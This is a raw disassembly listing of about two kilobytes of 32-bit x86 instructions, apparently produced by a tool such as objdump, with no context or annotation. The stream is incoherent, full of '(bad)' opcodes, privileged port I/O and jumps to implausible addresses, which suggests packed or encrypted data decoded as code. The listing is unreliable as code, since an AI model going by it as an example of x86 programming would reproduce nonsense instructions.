  40663f:	inc    bh
  406641:	add    eax,0x12b409ed
  406646:	cmp    al,0x58
  406648:	out    0xa9,eax
  40664a:	push   esp
  40664b:	add    BYTE PTR [eax+0x1],al
  40664e:	adc    bh,0x1d
  406651:	retf   0x8c75
  406654:	mov    ds:0x1b12664b,eax
  406659:	enter  0x8b70,0x8c
  40665d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40665e:	inc    dx
  406660:	add    ecx,DWORD PTR [esi-0x77]
  406663:	adc    eax,0xbddd0961
  406668:	push   ecx
  406669:	mov    al,ds:0xa30ae8c1
  40666e:	arpl   WORD PTR [esi+0x1b78b1bc],di
  406674:	fadd   DWORD PTR [eax-0x7a]
  406677:	xor    DWORD PTR [ecx+0x385d8708],edi
  40667d:	sti    
  40667e:	and    esi,DWORD PTR ds:0xad850f02
  406684:	xchg   edi,eax
  406685:	mov    al,ds:0x3f134648
  40668a:	sub    ch,cl
  40668c:	jmp    0xdb856c57
  406691:	or     al,0x44
  406693:	sub    BYTE PTR [ecx-0x45ffaa4f],ah
  406699:	out    dx,al
  40669a:	push   es
  40669b:	out    dx,eax
  40669c:	call   0xbab81efa
  4066a1:	mov    esi,DWORD PTR [ecx-0x42c11e0a]
  4066a7:	mov    al,ds:0x8856241d
  4066ac:	sbb    eax,0x6f0c224d
  4066b1:	iret   
  4066b2:	rol    BYTE PTR [esi-0x21],cl
  4066b5:	popa   
  4066b6:	mov    eax,0x8958da1
  4066bb:	mov    BYTE PTR [ebx+0x2f06f70],dl
  4066c1:	inc    eax
  4066c2:	inc    edx
  4066c3:	cmp    eax,0x8df5755b
  4066c8:	test   DWORD PTR [ecx],esp
  4066ca:	(bad)  
  4066cb:	shl    DWORD PTR ds:0x6610be9a,1
  4066d1:	sub    BYTE PTR [eax-0x13],ch
  4066d4:	mov    dh,0xf
  4066d6:	setg   BYTE PTR [esi+0x2]
  4066da:	mov    ebx,0x77a0b1
  4066df:	fmul   QWORD PTR [ebx]
  4066e1:	out    dx,al
  4066e2:	inc    ebx
  4066e3:	cmp    WORD PTR [edx],0x3a
  4066e7:	xchg   esp,eax
  4066e8:	ror    DWORD PTR [eax+0x15fdb20d],0x6
  4066ef:	mov    esi,0x483236e6
  4066f4:	jne    0x4066df
  4066f6:	jmp    0x406726
  4066f8:	push   0x4a
  4066fa:	mov    ebp,gs
  4066fc:	push   esi
  4066fd:	pop    esi
  4066fe:	pop    edx
  4066ff:	dec    ebx
  406700:	enter  0xa2c0,0x39
  406704:	push   0x2a
  406706:	and    DWORD PTR ds:0x2514c160,ebp
  40670c:	pop    es
  40670d:	outs   dx,DWORD PTR ds:[esi]
  40670e:	ja     0x14c4259
  406714:	out    dx,al
  406715:	xor    DWORD PTR [ecx+0x4],edi
  406718:	cld    
  406719:	dec    eax
  40671a:	pusha  
  40671b:	dec    ecx
  40671c:	jne    0x406717
  40671e:	push   ebx
  40671f:	and    BYTE PTR [edi+0x7c02d0b4],0x27
  406726:	mov    al,ds:0x188b0860
  40672b:	sbb    eax,0xf62e396b
  406730:	test   DWORD PTR [eax+esi*8-0xc95bf9],ecx
  406737:	xchg   esi,eax
  406738:	xor    ecx,esi
  40673a:	xor    ecx,ecx
  40673c:	mov    edx,0x5587d914
  406741:	lock mov eax,0x415a4600
  406747:	adc    ch,BYTE PTR [ebp+0x0]
  40674a:	pop    ebx
  40674b:	sti    
  40674c:	jp     0x40673b
  40674e:	mov    esp,0x431bba98
  406753:	sub    BYTE PTR [ebp+ebp*4-0x5dd0d660],ah
  40675a:	push   esp
  40675b:	inc    esi
  40675c:	call   0xe446a8a2
  406761:	sbb    al,0xe8
  406763:	jb     0x40675c
  406765:	mov    cl,0x5f
  406767:	mov    WORD PTR [ecx+0x390fba2c],?
  40676d:	mov    ah,0xa2
  40676f:	jle    0x406796
  406771:	cs mov edx,0xf272030e
  406777:	pop    ebp
  406778:	jg     0x40670d
  40677a:	in     al,0x19
  40677c:	in     al,0x72
  40677e:	leave  
  40677f:	frstor [eax]
  406781:	sub    BYTE PTR [ebp+0x2f],0xba
  406785:	sbb    eax,0x95203481
  40678a:	out    0xdc,al
  40678c:	enter  0xdc1f,0x49
  406790:	outs   dx,BYTE PTR ds:[esi]
  406791:	push   ds
  406792:	sub    BYTE PTR [eax-0x1f5f725e],ah
  406798:	mov    eax,0xa9019a84
  40679d:	mov    ah,0xd4
  40679f:	pop    eax
  4067a0:	fsub   DWORD PTR [eax]
  4067a2:	aam    0xd8
  4067a4:	scas   al,BYTE PTR es:[edi]
  4067a5:	jge    0x406737
  4067a7:	dec    edi
  4067a8:	fdivr  DWORD PTR [eax-0x45c54e78]
  4067ae:	push   ds
  4067af:	(bad)  [ebx+eax*1-0x2fa25abd]
  4067b6:	jle    0x4067a8
  4067b8:	sub    BYTE PTR [edi-0x30],ah
  4067bb:	and    BYTE PTR [ebp-0x6f4736ca],dl
  4067c1:	int3   
  4067c2:	inc    edx
  4067c3:	cld    
  4067c4:	sub    DWORD PTR [edx],edi
  4067c6:	adc    al,0x92
  4067c8:	cmp    al,0xcc
  4067ca:	mov    eax,0x2720fb94
  4067cf:	add    eax,0xc8ee85a1
  4067d4:	and    eax,0x326b5099
  4067d9:	enter  0xb43e,0xb0
  4067dd:	add    ecx,ebx
  4067df:	mov    bl,0x8
  4067e1:	mov    ch,0x14
  4067e3:	sbb    eax,0xc936c47c
  4067e8:	sbb    BYTE PTR [ebx+eiz*1+0x7c23fc4],0x72
  4067f0:	leave  
  4067f1:	xchg   ebx,eax
  4067f2:	rol    BYTE PTR ds:0xe3f4c010,0x20
  4067f9:	bswap  eax
  4067fb:	mov    edx,0x30baf820
  406800:	push   DWORD PTR [ebp+0x42]
  406803:	fsubr  st,st(6)
  406805:	es inc esi
  406807:	cld    
  406808:	push   0xf40e1e40
  40680d:	mov    eax,0xc005edc9
  406812:	stos   BYTE PTR es:[edi],al
  406813:	fnsave [eax]
  406815:	add    al,0x39
  406817:	dec    esp
  406818:	cs mov ecx,0xf09cc818
  40681e:	or     al,0x46
  406820:	cld    
  406821:	sbb    al,0x46
  406823:	lea    eax,[edx]
  406825:	adc    eax,0xbac0b4ae
  40682a:	adc    BYTE PTR [edx-0x127a5c5b],bh
  406830:	lahf   
  406831:	fild   DWORD PTR [eax]
  406833:	mov    esp,0x2f6d0619
  406838:	fs das 
  40683a:	aaa    
  40683b:	scas   eax,DWORD PTR es:[edi]
  40683c:	mov    ecx,0x6dafe006
  406841:	add    BYTE PTR [eax],ah
  406843:	fs sub al,0x20
  406846:	pop    DWORD PTR [edx]
  406848:	pop    edx
  406849:	aaa    
  40684a:	cdq    
  40684b:	mov    dh,0x61
  40684d:	ins    DWORD PTR es:[edi],dx
  40684e:	pop    ss
  40684f:	jo     0x4067e8
  406851:	push   0x51c2d47
  406856:	cmc    
  406857:	push   0x15200768
  40685c:	inc    edx
  40685d:	aaa    
  40685e:	test   BYTE PTR [ecx-0x50dfe2e1],0x7c
  406865:	(bad)  
  406866:	jl     0x40689e
  406868:	cmp    cl,ah
  40686a:	pop    ss
  40686b:	push   es
  40686c:	cmp    dh,BYTE PTR [ebx+0x73]
  40686f:	ss and eax,0x1b0b4fe0
  406875:	add    edi,ecx
  406877:	ss stc 
  406879:	or     DWORD PTR [edx+ecx*1],ebx
  40687c:	(bad)  
  40687d:	in     al,dx
  40687e:	jp     0x40686c
  406880:	mov    ch,0xa2
  406882:	test   BYTE PTR [esi+0x37a7682e],0x89
  406889:	xor    edx,DWORD PTR ds:0xc032a0c8
  40688f:	out    dx,al
  406890:	in     al,dx
  406891:	mov    DWORD PTR [edi+eiz*1],ebx
  406894:	rol    BYTE PTR [edx+edi*1-0x30],1
  406898:	es cld 
  40689a:	dec    ebp
  40689b:	adc    eax,0x6abf51d9
  4068a0:	add    DWORD PTR [ebx-0x24a837f3],ecx
  4068a6:	je     0x406910
  4068a8:	int    0x1
  4068aa:	fstp   DWORD PTR [edx]
  4068ac:	or     al,0x14
  4068ae:	sub    ch,BYTE PTR [eax+ebx*2]
  4068b1:	xchg   edx,eax
  4068b2:	lock mov DWORD PTR [esi],ecx
  4068b5:	pop    es
  4068b6:	mov    esp,0x8b0c5af4
  4068bb:	ret    0x1f45
  4068be:	repz mov ch,0xa5
  4068c1:	invlpg BYTE PTR [ecx-0x14]
  4068c5:	mov    DWORD PTR [ebx+0x51],edx
  4068c8:	mov    dl,0xad
  4068ca:	sbb    al,0x1b
  4068cc:	jecxz  0x406873
  4068ce:	pop    eax
  4068cf:	lock stos BYTE PTR es:[edi],al
  4068d1:	or     DWORD PTR [esp+ebx*8],ebx
  4068d4:	aas    
  4068d5:	mov    ebx,0xf46a5300
  4068da:	int3   
  4068db:	add    eax,DWORD PTR [ecx+0x301388b1]
  4068e1:	cwde   
  4068e2:	iret   
  4068e3:	data16 loopne 0x4068e9
  4068e6:	push   ecx
  4068e7:	push   es
  4068e8:	push   eax
  4068e9:	sbb    eax,eax
  4068eb:	in     eax,0xcb
  4068ed:	sar    ebp,0x9
  4068f0:	pop    es
  4068f1:	push   0x86e8b66c
  4068f6:	mov    bl,ah
  4068f8:	or     eax,0x7ccc6ba8
  4068fd:	push   ds
  4068fe:	or     DWORD PTR [eax-0x56aed75d],edx
  406904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406905:	fwait
  406906:	jnp    0x40694c
  406908:	or     ebx,DWORD PTR [edx+ecx*1-0x48]
  40690c:	lock sar BYTE PTR [edi],1
  40690f:	and    BYTE PTR [eax+esi*8],ah
  406912:	and    eax,0x6944675b
  406917:	jae    0x406984
  406919:	adc    BYTE PTR [ebx],bl
  40691b:	dec    eax
  40691c:	cld    
  40691d:	inc    esi
  40691e:	jb     0x406985
  406920:	gs push ebx
  406922:	jo     0x40698c
  406924:	inc    ebp
  406925:	js     0x4068f6
  406927:	loope  0x406948
  406929:	jl     0x406900
  40692b:	cwde   
  40692c:	xadd   DWORD PTR [edx],eax
  40692f:	inc    eax
  406930:	ret    
  406931:	mov    edx,0x7bc217b1
  406936:	xor    al,0x48
  406939:	ret    
  40693a:	xchg   DWORD PTR [eax],edx
  40693c:	dec    edi
  40693d:	sbb    eax,0xca8c281d
  406942:	out    0x15,eax
  406944:	mov    BYTE PTR [edx-0x3c],cl
  406947:	imul   eax,DWORD PTR [ebx],0x4e
  40694a:	lea    esi,[ebp+eiz*1+0x62]
  40694e:	mov    ch,0xd0
  406950:	mov    eax,ds:0x9f445408
  406955:	icebp  
  406956:	sub    bl,ah
  406958:	sar    DWORD PTR [esi],0xea
  40695b:	push   cs
  40695c:	stos   DWORD PTR es:[edi],eax
  40695d:	inc    ebp
  40695e:	add    BYTE PTR [ecx],ah
  406960:	and    DWORD PTR [ebp-0x66ef7cec],0x5ac5ed88
  40696a:	stos   BYTE PTR es:[edi],al
  40696b:	not    BYTE PTR [eax]
  40696d:	jne    0x406940
  40696f:	mov    bh,BYTE PTR [edx-0x80]
  406972:	loop   0x4069cf
  406974:	jmp    0x80b0:0x21bb1fc2
  40697b:	call   0xeff8:0x5b54c17e
  406982:	and    al,0x64
  406984:	(bad)  
  406985:	push   ecx
  406986:	mov    ecx,0xa142dbe1
  40698b:	dec    eax
  40698c:	in     al,dx
  40698d:	dec    BYTE PTR [edx-0xbacdfc]
  406993:	and    al,0xf
  406995:	pusha  
  406996:	test   eax,0x27de108c
  40699b:	mov    al,ds:0x446b7f0c
  4069a0:	pop    esi
  4069a1:	jg     0x40694a
  4069a3:	and    BYTE PTR [esi],ah
  4069a5:	or     ebp,DWORD PTR [esp+ebx*1]
  4069a8:	icebp  
  4069a9:	pop    ecx
  4069aa:	push   eax
  4069ab:	mov    esi,0xc0838644
  4069b0:	outs   dx,BYTE PTR ds:[esi]
  4069b1:	or     edx,edx
  4069b3:	jmp    0x4069bb
  4069b5:	pop    ss
  4069b6:	mov    esi,0xb6c7b1b9
  4069bb:	adc    al,0x3b
  4069bd:	push   0x1aee7504
  4069c2:	pop    ss
  4069c3:	std    
  4069c4:	test   ecx,ebx
  4069c6:	inc    ecx
  4069c7:	fdiv   QWORD PTR gs:[edi]
  4069ca:	xor    edi,DWORD PTR [eax-0x15f8a41f]
  4069d0:	data16 fimul WORD PTR [ecx+ecx*4]
  4069d4:	dec    edx
  4069d5:	mov    DWORD PTR [eax],ecx
  4069d7:	mov    DWORD PTR [eax+0x8],0xa74ecf28
  4069de:	js     0x406a5c
  4069e0:	pop    ss
  4069e1:	pushf  
  4069e2:	mov    eax,ds:0xa648168d
  4069e7:	test   BYTE PTR [eax+0x42],dh
  4069ea:	mov    esp,0xc80224a4
  4069ef:	xor    edx,ecx
  4069f1:	and    al,0x95
  4069f3:	shr    DWORD PTR [ecx-0x3fa3fd9a],1
  4069f9:	adc    BYTE PTR [ebx-0x4dfd1f30],bh
  4069ff:	push   eax
  406a00:	or     BYTE PTR [esi-0x7e],bl
  406a03:	loopne 0x4069c8
  406a05:	fwait
  406a06:	popf   
  406a07:	mov    bh,0x34
  406a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a0a:	ret    
  406a0b:	imul   esi,DWORD PTR [eax+0x33833e99],0xab99e30
  406a15:	add    edi,DWORD PTR [esi-0x275e3e46]
  406a1b:	cmp    ebx,0xec13f813
  406a21:	sbb    DWORD PTR [esp+ecx*1-0x7d],esi
  406a25:	push   ss
  406a26:	mov    DWORD PTR [edx+0x4],eax
  406a29:	jmp    0x406a36
  406a2b:	imul   ecx,DWORD PTR [eax+0x18bd718c],0x2f
  406a32:	mov    ah,0xc6
  406a34:	or     al,BYTE PTR [eax+0x7d241f7]
  406a3a:	mov    eax,es
  406a3c:	pop    ds
  406a3d:	xchg   ecx,eax
  406a3e:	and    DWORD PTR [eax-0x1cfdb939],edx
  406a44:	sub    ebp,eax
  406a46:	aas    
  406a47:	scas   al,BYTE PTR es:[edi]
  406a48:	inc    DWORD PTR [edx]
  406a4a:	inc    edi
  406a4b:	or     BYTE PTR [ecx-0x6cdeefba],cl
  406a51:	sub    al,0xda
  406a53:	mov    cl,0x1f
  406a55:	adc    al,0x4c
  406a57:	sbb    BYTE PTR [edi+0x66b000c6],dh
  406a5d:	retf   0x7269
  406a60:	sub    ah,BYTE PTR [eax]
  406a62:	xchg   BYTE PTR [ebp-0x2e545f35],ah
  406a68:	(bad)  
  406a69:	mov    bh,0xd9
  406a6b:	jl     0x406a9b
  406a6d:	sub    eax,0xa9d53e0a
  406a72:	jbe    0x406a47
  406a74:	ins    DWORD PTR es:[edi],dx
  406a75:	(bad)  
  406a76:	mov    eax,DWORD PTR [ebx-0x3b35dc4c]
  406a7c:	fst    DWORD PTR [eax]
  406a7e:	adc    al,0x20
  406a80:	pop    eax
  406a81:	cs int3 
  406a83:	dec    ecx
  406a84:	inc    ecx
  406a85:	mov    ds:0xae5cc69c,al
  406a8a:	std    
  406a8b:	data16 aas 
  406a8d:	inc    eax
  406a8e:	push   ebx
  406a8f:	dec    edx
  406a90:	fcom   DWORD PTR [edi]
  406a92:	call   0xdc194eab
  406a97:	xchg   ebx,eax
  406a98:	push   eax
  406a99:	sbb    BYTE PTR [edx+0x37],dl
  406a9c:	dec    ebx
  406a9d:	add    BYTE PTR [edi],bl
  406a9f:	adc    al,0x9e
  406aa1:	loope  0x406a3e
  406aa3:	xor    DWORD PTR [edi],edx
  406aa5:	call   0xf88f6c5d
  406aaa:	cmp    edi,DWORD PTR [ebp-0x2f]
  406aad:	mov    eax,0x84203b18
  406ab2:	test   bh,ah
  406ab4:	test   al,0xc0
  406ab6:	popa   
  406ab7:	sbb    BYTE PTR [ebx-0x6712d7ee],ah
  406abd:	jle    0x406ad1
  406abf:	mov    cl,0xd8
  406ac1:	or     eax,0x704c38a7
  406ac6:	seta   bl
  406ac9:	fdivr  QWORD PTR [ebx]
  406acb:	test   al,0xe
  406acd:	les    esp,FWORD PTR [edx+eiz*1]
  406ad0:	shl    DWORD PTR [esi+0x121aeb8c],0x2a
  406ad7:	pop    ds
  406ad8:	or     al,0x3c
  406ada:	cld    
  406adb:	add    dl,cl
  406add:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ade:	lods   al,BYTE PTR ds:[esi]
  406adf:	pop    es
  406ae0:	mov    ebx,0x85fdcccf
  406ae5:	test   eax,0x360e3320
  406aea:	xor    edi,DWORD PTR ds:0xcbd27547
  406af0:	sti    
  406af1:	in     al,0x6d
  406af3:	mov    ebx,0x89980884
  406af8:	jge    0x406a94
  406afa:	sub    BYTE PTR [edx+0x48dfeba3],bh
  406b00:	cmp    esp,esp
  406b02:	sete   bl
  406b05:	inc    DWORD PTR [ebp-0x7a]
  406b08:	ret    
  406b09:	and    DWORD PTR [eax+0x60e47f6],edx
  406b0f:	xchg   BYTE PTR [ebx+eax*2],cl
  406b12:	dec    DWORD PTR [ebx+0x1c]
  406b15:	cmp    DWORD PTR [ebx+0x1c],0xffffff92
  406b19:	xor    DWORD PTR [ebp+0x43b80a27],0x16f94370
  406b23:	cld    
  406b24:	inc    eax
  406b25:	mov    ecx,0xa86bedc3
  406b2a:	clc    
  406b2b:	pop    edi
  406b2c:	mov    dh,0x40
  406b2e:	(bad)
  406b32:	int3   
  406b33:	pop    edx
  406b34:	cpuid  
  406b36:	es clc 
  406b38:	nop
  406b39:	cmp    eax,0xffffffb0
  406b3c:	inc    edi
  406b3d:	inc    DWORD PTR [eax+0xc]
  406b40:	mov    ebp,0xff858301
  406b45:	jo     0x406b68
  406b47:	cmp    eax,DWORD PTR [edi+0x24]
  406b4a:	je     0x406b8c
  406b4c:	mov    cs,WORD PTR [ecx+0x3c53ff04]
  406b52:	xchg   ecx,eax
  406b53:	test   eax,0x8d27eb10
  406b58:	inc    edi
  406b59:	jecxz  0x406b13
  406b5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b5c:	add    DWORD PTR [ebx],0x4a
  406b5f:	xchg   edi,eax
  406b60:	(bad)  
  406b61:	ficom  WORD PTR [ebp+0x27fedb70]
  406b67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b68:	push   eax
  406b69:	push   ecx
  406b6a:	dec    ebp
  406b6b:	cwde   
  406b6c:	mov    cl,BYTE PTR [eax]
  406b6e:	jbe    0x406b1b
  406b70:	pusha  
  406b71:	int    0x5a
  406b73:	jg     0x406b50
  406b75:	dec    eax
  406b76:	or     al,0x39
  406b78:	and    DWORD PTR [esi-0x6a],0x64
  406b7c:	dec    eax
  406b7d:	in     eax,dx
  406b7e:	inc    ebx
  406b7f:	xor    al,0xa8
  406b81:	call   0xd3a8028b
  406b86:	enter  0xf981,0x9
  406b8a:	mov    bl,0xeb
  406b8c:	sbb    DWORD PTR [ecx],ebp
  406b8e:	mov    ecx,DWORD PTR [eax-0xbeac3da]
  406b94:	(bad)  
  406b95:	(bad)  
  406b96:	(bad)  
  406b98:	(bad)  
  406b99:	add    eax,0x2a350782
  406b9e:	adc    BYTE PTR [esi],bh
  406ba0:	pop    esp
  406ba1:	and    BYTE PTR [esi+0x6e],cl
  406ba4:	push   0x69
  406ba6:	push   eax
  406ba7:	mov    WORD PTR [edi],gs
  406ba9:	sub    al,0xc6
  406bab:	xchg   esp,eax
  406bac:	clc    
  406bad:	test   BYTE PTR [ecx+esi*4-0x9e50c32],ch
  406bb4:	lock push cs
  406bb6:	dec    esp
  406bb7:	call   0x7a2809f2
  406bbc:	fsubrp st(0),st
  406bbe:	cs rcr al,1
  406bc1:	in     al,0xd0
  406bc3:	in     al,dx
  406bc4:	repz cmp al,0xcf
  406bc7:	jnp    0x406b91
  406bc9:	push   ds
  406bca:	cmp    al,al
  406bcc:	je     0x406b86
  406bce:	cmp    al,0xef
  406bd0:	jns    0x406ba1
  406bd2:	pop    eax
  406bd3:	mov    al,0xe
  406bd5:	jo     0x406b7f
  406bd7:	push   ds
  406bd8:	sbb    BYTE PTR [eax-0xc306587],ah
  406bde:	and    BYTE PTR [eax+0x1c905814],bl
  406be4:	out    dx,eax
  406be5:	jns    0x406b85
  406be7:	out    0x88,eax
  406be9:	inc    esp
  406bea:	sbb    BYTE PTR [eax+edi*2-0x43087702],0xa7
  406bf2:	cmp    al,0x70
  406bf4:	cs push 0x9e60300e
  406bfa:	sahf   
  406bfb:	rcl    BYTE PTR [esi+ebx*4+0x2c],cl
  406bff:	pop    eax
  406c00:	pop    eax
  406c01:	push   eax
  406c02:	push   cs
  406c03:	dec    eax
  406c04:	iret   
  406c05:	jnp    0x406be5
  406c07:	repz out dx,al
  406c09:	loopne 0x406c4b
  406c0b:	push   cs
  406c0c:	mov    esp,0x30844e38
  406c11:	out    0x3d,eax
  406c13:	out    dx,eax
  406c14:	jns    0x406c24
  406c16:	int3   
  406c17:	sub    BYTE PTR [esi],ch
  406c19:	and    BYTE PTR [eax],0x5e
  406c1c:	adc    BYTE PTR [ebp+edx*1+0x2e18bca0],bh
  406c23:	sub    BYTE PTR [esi+eiz*1],bh
  406c26:	add    al,0xf9
  406c28:	inc    esi
  406c29:	mov    esi,0x160c01ee
  406c2e:	mov    al,ds:0xc42e0856
  406c33:	push   edi
  406c34:	daa    
  406c35:	out    dx,eax
  406c36:	in     al,0x19
  406c38:	add    al,0x8c
  406c3a:	add    BYTE PTR [esi],dl
  406c3c:	enter  0x39fc,0x79
  406c40:	dec    esi
  406c41:	call   0xdef4:0xa8f8c051
  406c48:	leave  
  406c49:	xor    esi,edx
  406c4b:	and    al,0x57
  406c4d:	lock cwde 
  406c4f:	in     al,dx
  406c50:	inc    esi
  406c51:	les    edx,FWORD PTR [ebx-0x17b10d89]
  406c57:	cs jl  0x406c3e
  406c5a:	push   ss
  406c5b:	loopne 0x406cd0
  406c5d:	repnz dec esi
  406c5f:	sahf   
  406c60:	loopne 0x406c3a
  406c62:	fmul   QWORD PTR [esi+0x2779d8a4]
  406c68:	iret   
  406c69:	leave  
  406c6a:	adc    al,0xd4
  406c6c:	cld    
  406c6d:	rcl    BYTE PTR [esi],1
  406c6f:	mov    BYTE PTR [esi-0x22],cl
  406c72:	leave  
  406c73:	cmp    ecx,esp
  406c75:	inc    esi
  406c76:	aam    0xc8
  406c78:	push   ss
  406c79:	pusha  
  406c7a:	les    edi,FWORD PTR [ebx+edx*4-0xbb90d89]
  406c81:	shr    BYTE PTR [esi],0x54
  406c84:	mov    esp,0xe7939016
  406c89:	in     al,0x9d
  406c8b:	mov    eax,0x4b45c76
  406c90:	ja     0x406c84
  406c92:	dec    esi
  406c93:	sahf   
  406c94:	mov    al,0x84
  406c96:	lods   al,BYTE PTR ds:[esi]
  406c97:	cs inc eax
  406c99:	test   al,0x16
  406c9b:	jns    0x406cc4
  406c9d:	iret   
  406c9e:	enter  0x5824,0xa4
  406ca2:	add    BYTE PTR [eax-0x1191878a],ah
  406ca8:	in     al,0x39
  406caa:	pushf  
  406cab:	fcomp  QWORD PTR [eax-0x436be829]
  406cb1:	fwait
  406cb2:	jb     0x406ca6
  406cb4:	out    dx,al
  406cb5:	clc    
  406cb6:	nop
  406cb7:	ja     0x406c45
  406cb9:	inc    esi
  406cba:	lods   al,BYTE PTR ds:[esi]
  406cbb:	daa    
  406cbc:	out    dx,eax
  406cbd:	in     al,0x9d
  406cbf:	mov    BYTE PTR [esi],dl
  406cc1:	jo     0x406c47
  406cc3:	inc    esi
  406cc4:	or     BYTE PTR [eax+0x793bc9cf],al
  406cca:	jbe    0x406d40
  406ccc:	jl     0x406cfc
  406cce:	cmp    BYTE PTR [eax+0x30],bl
  406cd1:	adc    dh,BYTE PTR [eax]
  406cd3:	jns    0x406cfc
  406cd5:	push   esp
  406cd6:	jbe    0x406cbc
  406cd8:	jle    0x406caa
  406cda:	and    DWORD PTR [edi],esp
  406cdc:	xlat   BYTE PTR ds:[ebx]
  406cdd:	pop    ebp
  406cde:	mov    edi,0x4a859a88
  406ce3:	add    DWORD PTR [ebp-0x17f17809],edx
  406ce9:	xchg   esp,eax
  406cea:	adc    eax,0xa60804ab
  406cef:	cdq    
  406cf0:	ret    0x914b
  406cf3:	cmc    
  406cf4:	jl     0x406cae
  406cf6:	dec    esp
  406cf7:	push   edx
  406cf8:	jp     0x406d10
  406cfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cfb:	inc    eax
  406cfc:	in     al,0xa5
  406cfe:	sti    
  406cff:	adc    BYTE PTR [ecx+0x72914b8],bl
  406d05:	shl    BYTE PTR [ebx+0x1cf2f20c],1
  406d0b:	sub    al,0x51
  406d0d:	add    al,BYTE PTR [eax]
  406d0f:	adc    BYTE PTR [ebx+ebp*8],ah
  406d12:	fs jns 0x406cf6
  406d15:	in     eax,dx
  406d16:	or     al,0xf
  406d18:	stc    
  406d19:	sahf   
  406d1a:	add    edi,DWORD PTR es:[eax+0x2c1f80b8]
  406d21:	dec    eax
  406d22:	sbb    DWORD PTR [bx+si+0x13],esp
  406d26:	jnp    0x406ccf
  406d28:	jge    0x406d46
  406d2a:	sub    DWORD PTR [eax],eax
  406d2c:	pop    esp
  406d2d:	enter  0x73,0xd0
  406d31:	data16 or al,0xa0
  406d34:	mov    ebx,0x958c60
  406d39:	and    eax,0x21c81398
  406d3e:	xchg   DWORD PTR [esp+edx*4],ebx
  406d41:	nop
  406d42:	mov    BYTE PTR [eax-0x7b8de379],dl
  406d48:	js     0x406d16
  406d4a:	push   eax
  406d4b:	and    BYTE PTR [eax],0x6d
  406d4e:	fs mov eax,0xc3b42632
  406d54:	inc    eax
  406d55:	push   cs
  406d56:	xchg   edi,eax
  406d57:	ja     0x406dbd
  406d59:	mov    edi,0x1e57e0ff
  406d5e:	jb     0x406d30
  406d60:	sub    DWORD PTR ds:0xb8407301,0x18
  406d67:	mov    ebx,0xff67dd42
  406d6c:	inc    ecx
  406d6d:	sub    cl,BYTE PTR [eax+edi*4+0x4]
  406d71:	mov    esp,0x3d807413
  406d76:	pop    ebp
  406d77:	fisubr WORD PTR [esi+0xeb2ec8b]
  406d7d:	mov    WORD PTR [esi-0x1c],ss
  406d80:	mov    edi,0x2b7c8708
  406d85:	out    dx,eax
  406d86:	cwde   
  406d87:	clc    
  406d88:	adc    bl,BYTE PTR [ecx-0x5e1bcf5a]
  406d8e:	fcom   st(7)
  406d90:	loop   0x406da6
  406d92:	arpl   WORD PTR [eax],sp
  406d94:	lahf   
  406d95:	xor    BYTE PTR [eax+0x3c],bh
  406d98:	push   cs
  406d99:	add    cl,BYTE PTR [edi+0x47c00dff]
  406d9f:	cwde   
  406da0:	addr16 mov esp,0x149390bc
  406da6:	rcr    BYTE PTR [eax+0x23730467],0x97
  406dad:	mov    edi,0x73009705
  406db2:	cld    
  406db3:	clc    
  406db4:	inc    eax
  406db5:	mov    edi,0x7d8127d4
  406dba:	adc    BYTE PTR [esp+esi*2+0x7],dl
  406dbe:	mov    eax,0x24edea01
  406dc3:	jbe    0x406ddb
  406dc5:	jmp    0x406dde
  406dc7:	inc    eax
  406dc8:	sbb    BYTE PTR [eax+0x8],dl
  406dcb:	adc    al,0x65
  406dcd:	jg     0x406ddf
  406dcf:	es inc edi
  406dd1:	dec    esi
  406dd2:	mov    al,0x34
  406dd4:	pop    ebp
  406dd5:	ret    0x5f14
  406dd8:	xchg   edx,eax
  406dd9:	pop    ebx
  406dda:	and    ch,cl
  406ddc:	dec    ebp
  406ddd:	push   edi
  406dde:	pop    ss
  406ddf:	or     al,0x69
  406de1:	lock and eax,ebx
  406de4:	cwde   
  406de5:	aas    
  406de6:	pop    ebp
  406de7:	out    dx,al
  406de8:	ret    0xa465
  406deb:	or     eax,0x20bb0cc8
  406df0:	mov    ah,0x17
  406df2:	xor    ah,bl
  406df4:	sbb    ebp,DWORD PTR [edi]
  406df6:	mov    DWORD PTR [ebp+0x14],edx
  406df9:	(bad)  
  406dfa:	pop    ds
  406dfb:	and    BYTE PTR [esi],cl
  406dfd:	pop    esp
  406dfe:	lock sbb BYTE PTR [eax*4-0x78f1b5fc],0x20
  406e07:	mov    ?,WORD PTR [edi]
  406e09:	cmc    
  406e0a:	shl    BYTE PTR [edi-0x6d],0x6f
  406e0e:	popa   
  406e0f:	ret    
  406e10:	push   ss
  406e11:	adc    bh,dl
  406e13:	pop    edx
  406e14:	sar    DWORD PTR [edx+edx*4+0x40712103],0x61
  406e1c:	ror    DWORD PTR [esp+eax*4+0x5c],0x80
  406e21:	(bad)  
  406e22:	adc    al,0xe4
  406e24:	adc    al,cl
  406e26:	xchg   ebp,eax
  406e27:	int    0x32
  406e29:	ret    0x5790
  406e2c:	jb     0x406e4e
  406e2e:	mov    DWORD PTR [eax-0x7c363dc7],edx
  406e34:	nop
  406e35:	or     ebx,DWORD PTR [esi+0x28346c71]
  406e3b:	xchg   esp,eax
  406e3c:	pop    esp
  406e3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e3f:	clc    
  406e40:	int    0x5
  406e42:	mov    dl,0xab
  406e44:	clc    
  406e45:	jecxz  0x406e64
  406e47:	ret    
  406e48:	sub    eax,0xf9f24ff8
  406e4d:	and    al,0xf8
  406e4f:	lea    edx,[ebp-0x1]
  406e52:	pop    edi
  406e53:	fadd   QWORD PTR [eax-0x70d50083]
  406e59:	jge    0x406e4b
  406e5b:	add    ebp,esi
  406e5d:	sbb    eax,eax
  406e5f:	adc    al,0x66
  406e61:	mov    DWORD PTR [edx],eax
  406e63:	std    
  406e64:	and    al,0xc3
  406e66:	clc    
  406e67:	mov    WORD PTR [edx],ss
  406e69:	ror    DWORD PTR [eax-0x29],0xc2
  406e6d:	loopne 0x406e77
  406e6f:	mov    esp,0xd288f60d
  406e74:	sbb    BYTE PTR [edx+edx*8+0x9],0x90
  406e79:	adc    BYTE PTR [ebx],bl
